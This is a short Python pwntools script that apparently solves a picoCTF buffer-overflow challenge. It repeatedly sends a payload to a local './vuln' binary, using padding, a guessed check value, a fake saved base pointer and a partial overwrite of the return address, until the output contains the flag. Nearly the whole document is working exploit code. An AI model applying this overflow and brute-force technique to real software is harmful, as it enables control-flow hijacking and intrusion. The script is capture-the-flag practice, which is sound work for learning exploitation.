from pwn import *

"""
buffer is 0x30 away from ebp

Use brute force to get the flag.
"""

# Brute force
i = 0
context.log_level = 'error'
while True:
    i += 1
    print(str(i)),
    exploit = "256\n" + "a"*32 + "ex;Y" + "a"*12
    # ebp
    exploit += p32(0x41424344)
    # eip (partial overwrite)
    exploit += "\xed\x77\x55\x56"

    # print(exploit)
    # quit()

    sh = process("./vuln")
    sh.sendline(exploit)
    sh.recvline()
    output = sh.recvuntil("}", timeout = 0.03)
    if "picoCTF" in output:
        print("Flag found!")
        print(output)
        raw_input()
    sh.close()
